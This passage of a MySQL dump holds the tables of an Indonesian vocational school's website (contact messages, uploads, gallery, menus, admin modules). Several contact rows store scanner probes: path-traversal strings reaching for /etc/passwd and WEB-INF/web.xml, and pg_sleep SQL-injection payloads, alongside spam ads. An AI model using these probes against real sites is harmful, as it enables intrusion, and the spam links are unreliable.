INSERT INTO `tb_contact` VALUES (724, 'Acunetix hkwhfhrq', 'Acunetix', '.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (725, 'Acunetix jpkqpyml', 'Acunetix', '-1;select pg_sleep(9); --', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (726, 'Acunetix hkwhfhrq', 'Acunetix', '/etc/passwd', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (727, 'Acunetix jpkqpyml', 'Acunetix', '-1);select pg_sleep(3); --', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (728, 'Acunetix hkwhfhrq', 'Acunetix', '../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (729, 'Acunetix jpkqpyml', 'Acunetix', '-1));select pg_sleep(3); --', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (730, 'Acunetix hkwhfhrq', 'Acunetix', '../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (731, 'Acunetix jpkqpyml', 'Acunetix', 'QXTfUCh8\';select pg_sleep(3); --', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (732, 'Acunetix hkwhfhrq', 'Acunetix', '................etc/passwd', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (733, 'Acunetix jpkqpyml', 'Acunetix', '9WKC8S1u\');select pg_sleep(6); --', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (734, 'Acunetix hkwhfhrq', 'Acunetix', 'invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (735, 'Acunetix jpkqpyml', 'Acunetix', '5X95WhFw\'));select pg_sleep(6); --', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (736, 'Acunetix hkwhfhrq', 'Acunetix', 'file:///etc/passwd', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (737, 'Acunetix hkwhfhrq', 'Acunetix', '/\\../\\../\\../\\../\\../\\../\\../etc/passwd', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (738, 'Acunetix hkwhfhrq', 'Acunetix', 'WEB-INF/web.xml', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (739, 'Acunetix hkwhfhrq', 'Acunetix', 'WEB-INF\\web.xml', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (740, 'Acunetix imptfigt', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (741, 'Acunetix imptfigt', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (742, 'Acunetix imptfigt', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (743, 'Acunetix imptfigt', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (744, 'Acunetix imptfigt', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (745, 'Acunetix imptfigt', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (746, 'Acunetix imptfigt', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (747, 'Acunetix imptfigt', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (748, 'Acunetix imptfigt', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (749, 'ZAP ZAP', 'ZAP', 'ZAP', 'www.google.com/search?q=OWASP%20ZAP', '36.82.101.12', '0000-00-00');
INSERT INTO `tb_contact` VALUES (750, 'ZAP ZAP', 'ZAP', 'ZAP', 'www.google.com:80/search?q=OWASP%20ZAP', '36.82.101.12', '0000-00-00');
INSERT INTO `tb_contact` VALUES (751, 'Loan Cash Fastest Payday Loan', 'Loan Cash', 'tsbvbxdp', 'personal loan emi <a href=\"http://installmentloans.bid\">installment loans</a> installment loans <a href=http://installmentloans.bid>installment loans for bad credit</a>', '178.159.37.112', '0000-00-00');
INSERT INTO `tb_contact` VALUES (752, 'Claudette Gerstaecker', 'Claudette', 'The future of your Instagram', 'Hello! My name is John and there\'s something I\'d like to tell you. \r\nI recently did a research on Instagram user statistics and likes/Follower patterns across users, and found out that many users such as yourself suffer from a state of placidity. This means that despite regularly uploaded good content you\'re unable to grow further. The reason is that most of the regular Instagram users only watch and follow content that seems popular, while overlooking or ignoring content that has a low number of likes compared to the other popular content they follow. Have you noticed that you hit a wall with your account and that regardless of what you do you only stay where you are? If not, it will become apparent to you soon.\r\n\r\nThis is the reason why http://www.himzilikes.com was created. By using one of  our packages you can get above the threshold other users consider as unpopular and let your account grow to it\'s deserved follower size. Just select which package best suits you and your account and after less than 24 hours the package will be active.\r\n\r\nIf you have any questions feel free to ask.\r\n\r\nKind regards\r\nJohn Derring\r\nHimziLikes Foreman', '93.219.37.99', '0000-00-00');
INSERT INTO `tb_contact` VALUES (753, 'Randy Sinclair', 'Randy', 'Concerning smkn1jenpo.sch.id', 'Hi,\r\n\r\nMy name is Randy and I was looking at a few different sites online and came across your site smkn1jenpo.sch.id.  I must say - your website is very impressive.  I found your website on the first page of the Search Engine. \r\n\r\nHave you noticed that 70 percent of visitors who leave your website will never return?  In most cases, this means that 95 percent to 98 percent of your marketing efforts are going to waste, not to mention that you are losing more money in customer acquisition costs than you need to.\r\n \r\nAs a business person, the time and money you put into your marketing efforts is extremely valuable.  So why let it go to waste?  Our users have seen staggering improvements in conversions with insane growths of 150 percent going upwards of 785 percent. Are you ready to unlock the highest conversion revenue from each of your website visitors?  \r\n\r\nTalkWithLead is a widget which captures a website visitor’s Name, Email address and Phone Number and then calls you immediately, so that you can talk to the Lead exactly when they are live on your website — while they\'re hot!\r\n  \r\nTry the TalkWithLead Live Demo now to see exactly how it works.  Visit: https://www.talkwithlead.com/Contents/LiveDemo.aspx\r\n\r\nWhen targeting leads, speed is essential - there is a 100x decrease in Leads when a Lead is contacted within 30 minutes vs being contacted within 5 minutes.\r\n\r\nIf you would like to talk to me about this service, please give me a call.  We do offer a 30 days free trial.  \r\n\r\nThanks and Best Regards,\r\nRandy', '104.203.117.118', '0000-00-00');
INSERT INTO `tb_contact` VALUES (754, 'Lahontan Sumass', 'Lahontan', 'Please note offering', 'Good day! There is a good offer for you. http://bit.ly/2JXfocc', '85.17.25.11', '0000-00-00');

-- ----------------------------
-- Table structure for tb_corner
-- ----------------------------
DROP TABLE IF EXISTS `tb_corner`;
CREATE TABLE `tb_corner`  (
  `id_corner` int(11) NOT NULL AUTO_INCREMENT,
  `id_post` int(11) NOT NULL,
  PRIMARY KEY (`id_corner`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 20 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_corner
-- ----------------------------
INSERT INTO `tb_corner` VALUES (19, 245);

-- ----------------------------
-- Table structure for tb_file
-- ----------------------------
DROP TABLE IF EXISTS `tb_file`;
CREATE TABLE `tb_file`  (
  `id_file` int(11) NOT NULL AUTO_INCREMENT,
  `nama` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `ukuran` varchar(15) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `tanggal` datetime(0) NOT NULL,
  `link` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `type` varchar(50) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `trash` int(11) NOT NULL,
  PRIMARY KEY (`id_file`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 94 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_file
-- ----------------------------
INSERT INTO `tb_file` VALUES (1, '1-2.jpg', '198028', '2016-04-01 03:12:33', 'upload/1-2.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (2, '2-02_preview.jpg', '75027', '2016-04-01 03:13:36', 'upload/2-02_preview.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (3, '3-14-Formulir Jalur Reguler.docx', '74829', '2016-04-04 15:14:10', 'upload/3-14-Formulir Jalur Reguler.docx', 'docx', 0);
INSERT INTO `tb_file` VALUES (4, '4-Banner PMB AK.jpg', '307626', '2016-04-11 12:52:20', 'upload/4-Banner PMB AK.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (5, '5-jual-jaket-couple-300x300.jpg', '37887', '2016-04-14 07:21:19', 'upload/5-jual-jaket-couple-300x300.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (6, '6-logo.png', '48039', '2016-04-14 07:25:58', 'upload/6-logo.png', 'png', 0);
INSERT INTO `tb_file` VALUES (7, '7-profil.png', '10065', '2016-04-14 13:52:06', 'upload/7-profil.png', 'png', 0);
INSERT INTO `tb_file` VALUES (8, '8-lokasi.png', '10612', '2016-04-14 13:57:18', 'upload/8-lokasi.png', 'png', 0);
INSERT INTO `tb_file` VALUES (9, '9-bannerprestasi.jpg', '80138', '2016-04-14 15:48:34', 'upload/9-bannerprestasi.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (10, '10-Mekatronika.jpg', '217239', '2016-04-15 15:46:19', 'upload/10-Mekatronika.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (11, '11-Prestasi.jpg', '199922', '2016-04-15 15:46:19', 'upload/11-Prestasi.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (12, '12-banner1.jpg', '534319', '2016-10-06 06:55:29', 'upload/12-banner1.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (13, '13-image3.jpg', '21247', '2016-10-06 06:56:26', 'upload/13-image3.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (14, '14-image5.jpg', '29150', '2016-10-06 06:57:00', 'upload/14-image5.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (15, '15-image7.jpg', '19917', '2016-10-06 06:59:17', 'upload/15-image7.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (16, '16-image8.jpg', '71797', '2016-10-06 07:06:20', 'upload/16-image8.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (17, '17-ss.png', '280098', '2016-10-06 10:25:22', 'upload/17-ss.png', 'png', 0);
INSERT INTO `tb_file` VALUES (39, '18-2.png', '1882979', '2016-10-15 07:51:59', 'upload/18-2.png', 'png', 0);
INSERT INTO `tb_file` VALUES (40, '40-13.png', '1789632', '2016-10-15 07:55:31', 'upload/40-13.png', 'png', 0);
INSERT INTO `tb_file` VALUES (41, '41-7.png', '1942016', '2016-10-15 08:01:33', 'upload/41-7.png', 'png', 0);
INSERT INTO `tb_file` VALUES (42, '42-1.png', '1938255', '2016-10-15 08:01:33', 'upload/42-1.png', 'png', 0);
INSERT INTO `tb_file` VALUES (43, '43-21.png', '2032549', '2016-10-15 08:05:49', 'upload/43-21.png', 'png', 0);
INSERT INTO `tb_file` VALUES (44, '44-27.png', '1945509', '2016-10-15 08:05:49', 'upload/44-27.png', 'png', 0);
INSERT INTO `tb_file` VALUES (45, '45-17 (1).png', '1910685', '2016-10-15 08:05:49', 'upload/45-17 (1).png', 'png', 0);
INSERT INTO `tb_file` VALUES (46, '46-20.png', '1873577', '2016-10-15 08:05:49', 'upload/46-20.png', 'png', 0);
INSERT INTO `tb_file` VALUES (47, '47-17 (2).png', '1784479', '2016-10-15 08:05:50', 'upload/47-17 (2).png', 'png', 0);
INSERT INTO `tb_file` VALUES (48, '48-25.png', '1868343', '2016-10-15 08:05:50', 'upload/48-25.png', 'png', 0);
INSERT INTO `tb_file` VALUES (49, '49-28.png', '1588263', '2016-10-15 08:05:50', 'upload/49-28.png', 'png', 0);
INSERT INTO `tb_file` VALUES (50, '50-17 (2).png', '1574713', '2016-10-15 08:12:02', 'upload/50-17 (2).png', 'png', 0);
INSERT INTO `tb_file` VALUES (51, '51-34.png', '1633731', '2016-10-15 08:17:13', 'upload/51-34.png', 'png', 0);
INSERT INTO `tb_file` VALUES (52, '52-31.png', '1839392', '2016-10-15 08:18:13', 'upload/52-31.png', 'png', 0);
INSERT INTO `tb_file` VALUES (53, '53-rsz_dsc_7167.jpg', '685528', '2016-10-17 09:50:09', 'upload/53-rsz_dsc_7167.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (54, '54-rsz_dsc_7163.jpg', '618166', '2016-10-17 09:50:10', 'upload/54-rsz_dsc_7163.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (55, '55-rsz_dsc_7180.jpg', '629911', '2016-10-17 09:50:10', 'upload/55-rsz_dsc_7180.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (56, '56-rsz_dsc_7184.jpg', '667633', '2016-10-17 09:50:11', 'upload/56-rsz_dsc_7184.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (57, '57-rsz_dsc_7190.jpg', '704545', '2016-10-17 09:50:11', 'upload/57-rsz_dsc_7190.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (58, '58-rsz_dsc_7206.jpg', '611532', '2016-10-17 09:50:12', 'upload/58-rsz_dsc_7206.jpg', 'jpg', 0);
INSERT INTO `tb_file` VALUES (60, '60-ppdbp1.jpeg', '996275', '2018-05-12 12:15:51', 'upload/60-ppdbp1.jpeg', 'jpeg', 0);
INSERT INTO `tb_file` VALUES (61, '61-ppdbp2.jpeg', '688547', '2018-05-12 12:15:51', 'upload/61-ppdbp2.jpeg', 'jpeg', 0);
INSERT INTO `tb_file` VALUES (93, '93-03 JADWAL SELEKSI TOEIC VIERA 2018 SMKN 1 JENANGAN (REVISI 1).pdf', '326376', '2018-08-15 11:01:10', 'upload/93-03 JADWAL SELEKSI TOEIC VIERA 2018 SMKN 1 JENANGAN (REVISI 1).pdf', 'pdf', 0);

-- ----------------------------
-- Table structure for tb_galery
-- ----------------------------
DROP TABLE IF EXISTS `tb_galery`;
CREATE TABLE `tb_galery`  (
  `id_galery` int(11) NOT NULL AUTO_INCREMENT,
  `galery_image` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `galery_caption` varchar(200) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `galery_parent` int(11) NOT NULL,
  `galery_title` varchar(250) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `galery_description` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `galery_date_create` datetime(0) NOT NULL,
  `galery_status_cover` int(11) NOT NULL,
  `id_user` int(11) NOT NULL,
  PRIMARY KEY (`id_galery`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 29 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_galery
-- ----------------------------
INSERT INTO `tb_galery` VALUES (23, 'http://www.smkn1jenpo.sch.id/upload/54-rsz_dsc_7163.jpg', '', 0, 'Seleksi LKS Jawa TImur 2016', 'Seleksi Lomba Kompetensi Siswa tingkat kabupaten untuk daerah Ponorogo diselenggarakan di SMKN 1 Jenangan Ponorogo. ', '2016-10-17 09:51:26', 1, 3);
INSERT INTO `tb_galery` VALUES (24, 'http://www.smkn1jenpo.sch.id/upload/53-rsz_dsc_7167.jpg', '', 23, '', '', '2016-10-17 09:51:37', 0, 3);
INSERT INTO `tb_galery` VALUES (25, 'http://www.smkn1jenpo.sch.id/upload/55-rsz_dsc_7180.jpg', '', 23, '', '', '2016-10-17 09:51:42', 0, 3);
INSERT INTO `tb_galery` VALUES (26, 'http://www.smkn1jenpo.sch.id/upload/56-rsz_dsc_7184.jpg', '', 23, '', '', '2016-10-17 09:51:45', 0, 3);
INSERT INTO `tb_galery` VALUES (27, 'http://www.smkn1jenpo.sch.id/upload/57-rsz_dsc_7190.jpg', '', 23, '', '', '2016-10-17 09:51:49', 0, 3);
INSERT INTO `tb_galery` VALUES (28, 'http://www.smkn1jenpo.sch.id/upload/58-rsz_dsc_7206.jpg', '', 23, '', '', '2016-10-17 09:51:51', 0, 3);

-- ----------------------------
-- Table structure for tb_kategori
-- ----------------------------
DROP TABLE IF EXISTS `tb_kategori`;
CREATE TABLE `tb_kategori`  (
  `id_kategori` int(11) NOT NULL AUTO_INCREMENT,
  `nama` varchar(50) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  PRIMARY KEY (`id_kategori`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 7 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_kategori
-- ----------------------------
INSERT INTO `tb_kategori` VALUES (0, 'Uncategories');
INSERT INTO `tb_kategori` VALUES (4, 'OSIS STMJ INSPIRATION');
INSERT INTO `tb_kategori` VALUES (5, 'STMJ NEWS');
INSERT INTO `tb_kategori` VALUES (6, 'LKS JATIM 2018');

-- ----------------------------
-- Table structure for tb_label
-- ----------------------------
DROP TABLE IF EXISTS `tb_label`;
CREATE TABLE `tb_label`  (
  `id_label` int(11) NOT NULL AUTO_INCREMENT,
  `nama` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  PRIMARY KEY (`id_label`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 8 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_label
-- ----------------------------
INSERT INTO `tb_label` VALUES (1, 'action');
INSERT INTO `tb_label` VALUES (2, 'aknponorogo');
INSERT INTO `tb_label` VALUES (3, 'poltek');
INSERT INTO `tb_label` VALUES (4, 'kampus');
INSERT INTO `tb_label` VALUES (5, 'aknp');
INSERT INTO `tb_label` VALUES (6, 'stmj');
INSERT INTO `tb_label` VALUES (7, 'ppdb');

-- ----------------------------
-- Table structure for tb_link_luar
-- ----------------------------
DROP TABLE IF EXISTS `tb_link_luar`;
CREATE TABLE `tb_link_luar`  (
  `id_link` int(11) NOT NULL AUTO_INCREMENT,
  `nama` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `perent` int(11) NOT NULL,
  `link` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `no_urut` int(11) NOT NULL,
  PRIMARY KEY (`id_link`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_link_luar
-- ----------------------------
INSERT INTO `tb_link_luar` VALUES (1, 'Jurusan', 0, '', 1);
INSERT INTO `tb_link_luar` VALUES (2, 'Rekeyasa Perangkat Lunak', 1, '#', 1);
INSERT INTO `tb_link_luar` VALUES (3, 'Kontruksi Kayu', 1, '#', 2);
INSERT INTO `tb_link_luar` VALUES (4, 'Link Luar', 0, '', 2);
INSERT INTO `tb_link_luar` VALUES (6, 'Politeknik Elektronika Negeri Surabaya', 4, 'http://pens.ac.id', 2);
INSERT INTO `tb_link_luar` VALUES (10, 'AKN Ponorogo', 4, 'http://www.aknponorogo.ac.id', 2);

-- ----------------------------
-- Table structure for tb_menu
-- ----------------------------
DROP TABLE IF EXISTS `tb_menu`;
CREATE TABLE `tb_menu`  (
  `id_menu` int(11) NOT NULL AUTO_INCREMENT,
  `deskripsi` varchar(110) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `nama` varchar(110) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `name_eng` varchar(200) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `posisi` int(11) NOT NULL,
  `id_post` int(11) NOT NULL,
  `parent` int(11) NOT NULL,
  `type` varchar(110) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `urut` int(11) NOT NULL,
  `link` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  PRIMARY KEY (`id_menu`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 34 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_menu
-- ----------------------------
INSERT INTO `tb_menu` VALUES (1, '', 'BERANDA', 'HOME', 1, 0, 0, 'custom', 1, 'http://www.smkn1jenpo.sch.id/');
INSERT INTO `tb_menu` VALUES (2, '', 'TENTANG', 'ABOUT', 1, 245, 0, 'post', 2, 'http://www.smkn1jenpo.com/profil-smkn-1-jenangan-ponorogo');
INSERT INTO `tb_menu` VALUES (9, '', 'Program Keahlian', 'Program Expertise', 2, 0, 0, 'custom', 2, '#');
INSERT INTO `tb_menu` VALUES (10, '', 'Tentang Kami', 'About Us', 3, 245, 0, 'post', 1, 'http://www.smkn1jenpo.com/profil-smkn-1-jenangan-ponorogo');
INSERT INTO `tb_menu` VALUES (11, '', 'Hubungi Kami', 'Contact Us', 3, 0, 0, 'custom', 2, 'http://www.smkn1jenpo.sch.id/contact');
INSERT INTO `tb_menu` VALUES (12, '', 'Peta SItus', 'Sitemap', 3, 0, 0, 'custom', 3, 'http://www.smkn1jenpo.sch.id/sitemap');
INSERT INTO `tb_menu` VALUES (13, '', 'Produk', 'Product', 2, 0, 0, 'custom', 3, 'http://www.smkn1jenpo.sch.id/product');
INSERT INTO `tb_menu` VALUES (17, '', 'Galery', 'Gallery', 2, 0, 0, 'custom', 2, 'http://www.smkn1jenpo.sch.id/gallery');
INSERT INTO `tb_menu` VALUES (21, '', 'Extrakurikuler', 'Extrakurikuler', 2, 0, 0, '', 4, '#');
INSERT INTO `tb_menu` VALUES (22, '', 'Pramuka', 'Scout', 2, 0, 21, '', 2, '#');
INSERT INTO `tb_menu` VALUES (23, '', 'Seni Reog', 'The Art Of Reog', 2, 0, 21, '', 1, '#');
INSERT INTO `tb_menu` VALUES (24, '', 'Privasi & Kebijakan', 'Privacy & Policy', 3, 271, 0, 'post', 2, 'http://www.smkn1jenpo.com/privacy-policy');
INSERT INTO `tb_menu` VALUES (26, '', 'T. Pemesinan', 'Mechanical Engineering Department', 2, 0, 9, '', 1, '#');
INSERT INTO `tb_menu` VALUES (27, '', 'T. Las', 'Welding Engineering Department', 2, 0, 9, '', 2, '#');
INSERT INTO `tb_menu` VALUES (28, '', 'T. Desain Permodelan dan Informasi Bangunan', 'Model Designing and Information of Building Department', 2, 0, 9, '', 1, '#');
INSERT INTO `tb_menu` VALUES (29, '', 'T. Bisnis Konstruksi dan Properti', 'Construction Business and Property Department', 2, 0, 9, '', 2, '#');
INSERT INTO `tb_menu` VALUES (30, '', 'Tehnik dan Bisnis Sepeda Motor', 'Motorcycle Engineering and Business Department', 2, 0, 9, '', 2, '#');
INSERT INTO `tb_menu` VALUES (31, '', 'Rekeyasa Perangkat Lunak', 'Software Engineering Department', 2, 0, 9, '', 2, '#');
INSERT INTO `tb_menu` VALUES (32, '', 'Elektronika Industri', 'Industrial Electronics Department', 2, 0, 9, '', 2, '#');
INSERT INTO `tb_menu` VALUES (33, '', 'Otomasi Industri', 'Industrial Automation Department', 2, 0, 9, '', 2, '#');

-- ----------------------------
-- Table structure for tb_modul_admin
-- ----------------------------
DROP TABLE IF EXISTS `tb_modul_admin`;
CREATE TABLE `tb_modul_admin`  (
  `id_modul_admin` varchar(11) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `link` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `label` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `keterangan` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  PRIMARY KEY (`id_modul_admin`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_modul_admin
-- ----------------------------
INSERT INTO `tb_modul_admin` VALUES ('x0010', 'administrator', 'Home', 'Halaman utama');
INSERT INTO `tb_modul_admin` VALUES ('x0011', 'administrator/news', 'News', 'Page of news');
INSERT INTO `tb_modul_admin` VALUES ('x0012', 'administrator/pages', 'Pages', 'Page of pages');
INSERT INTO `tb_modul_admin` VALUES ('x0013', 'administrator/product', 'Product', 'Page of product');
INSERT INTO `tb_modul_admin` VALUES ('x0014', 'administrator/agenda', 'Agenda', 'Page of Agenda');
INSERT INTO `tb_modul_admin` VALUES ('x0015', 'administrator/announcement', 'Announcement', 'page of announcement');
INSERT INTO `tb_modul_admin` VALUES ('x0016', 'administrator/category', 'Category', 'page of Category');
INSERT INTO `tb_modul_admin` VALUES ('x0017', 'administrator/files', 'Files', 'page of files');
INSERT INTO `tb_modul_admin` VALUES ('x0018', 'administrator/menu', 'Menus', 'page of Menus');
INSERT INTO `tb_modul_admin` VALUES ('x0019', 'administrator/slider', 'Slider', 'page of slider');
INSERT INTO `tb_modul_admin` VALUES ('x0020', 'administrator/module', 'Module', '');
INSERT INTO `tb_modul_admin` VALUES ('x0021', 'administrator/user', 'User', 'page of user');
INSERT INTO `tb_modul_admin` VALUES ('x0022', 'administrator/profile', 'Profile', 'page of profile');
INSERT INTO `tb_modul_admin` VALUES ('x0023', 'administrator/research', 'Research', '');
INSERT INTO `tb_modul_admin` VALUES ('x0024', 'administrator/link', 'Link Luar', 'page of profile');
INSERT INTO `tb_modul_admin` VALUES ('x0025', 'administrator/galery', 'Gallery', 'page of Gallery');

-- ----------------------------
-- Table structure for tb_modul_manajemen
-- ----------------------------
DROP TABLE IF EXISTS `tb_modul_manajemen`;
CREATE TABLE `tb_modul_manajemen`  (
  `id_modul_manajemen` int(11) NOT NULL AUTO_INCREMENT,
  `label` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `posisi` int(2) NOT NULL,
  `perent` int(11) NOT NULL,
  `id_modul` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `ikon` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `urut` int(11) NOT NULL,
  PRIMARY KEY (`id_modul_manajemen`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 26 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_modul_manajemen
-- ----------------------------
INSERT INTO `tb_modul_manajemen` VALUES (1, 'Start', 0, 0, '', '', 1);
INSERT INTO `tb_modul_manajemen` VALUES (2, 'Homepage', 0, 0, '', '', 2);
INSERT INTO `tb_modul_manajemen` VALUES (3, 'Settings', 0, 0, '', '', 3);
INSERT INTO `tb_modul_manajemen` VALUES (4, 'Home', 1, 0, 'x0010', 'i-home text-danger-lt', 1);
INSERT INTO `tb_modul_manajemen` VALUES (5, 'Master', 1, 0, '', 'i-grid text-success-lter', 2);
INSERT INTO `tb_modul_manajemen` VALUES (6, 'Post & News', 1, 0, '#', 'i-support text-primary-lt', 1);
INSERT INTO `tb_modul_manajemen` VALUES (7, 'Announcemenet', 1, 5, 'x0015', 'i-support', 2);
INSERT INTO `tb_modul_manajemen` VALUES (8, 'Pages', 1, 5, 'x0012', 'i-circle-o', 3);
INSERT INTO `tb_modul_manajemen` VALUES (9, 'Product', 1, 5, 'x0013', 'i-circle', 2);
INSERT INTO `tb_modul_manajemen` VALUES (10, 'Agenda', 1, 5, 'x0014', 'i-support', 4);
INSERT INTO `tb_modul_manajemen` VALUES (11, 'Post & News', 1, 6, 'x0011', 'i-support', 2);
INSERT INTO `tb_modul_manajemen` VALUES (12, 'Category', 1, 6, 'x0016', '', 2);
INSERT INTO `tb_modul_manajemen` VALUES (13, 'Files', 1, 5, 'x0017', '', 3);
INSERT INTO `tb_modul_manajemen` VALUES (19, 'Menu', 2, 0, 'x0018', 'i i-circle-sm text-primary', 1);
INSERT INTO `tb_modul_manajemen` VALUES (21, 'Sliders', 3, 0, 'x0019', 'i i-dot', 1);
INSERT INTO `tb_modul_manajemen` VALUES (22, 'Modul Manajemen', 3, 0, 'x0020', 'i i-dot', 2);
INSERT INTO `tb_modul_manajemen` VALUES (23, 'User', 3, 0, 'x0021', 'i i-dot', 3);
INSERT INTO `tb_modul_manajemen` VALUES (24, 'Link Luar', 2, 0, 'x0024', 'i i-circle-sm text-danger', 2);
INSERT INTO `tb_modul_manajemen` VALUES (25, 'Galery', 1, 5, 'x0025', 'i i-circle-sm text-primary', 3);

-- ----------------------------
-- Table structure for tb_post
-- ----------------------------
DROP TABLE IF EXISTS `tb_post`;
CREATE TABLE `tb_post`  (
  `id_post` int(11) NOT NULL AUTO_INCREMENT,
  `kategori` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL COMMENT 'post || page',
  `judul` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `isi` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `diterbitkan` date NOT NULL,
  `last_update` datetime(0) NOT NULL,
  `jumlah_baca` int(11) NOT NULL,
  `link` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
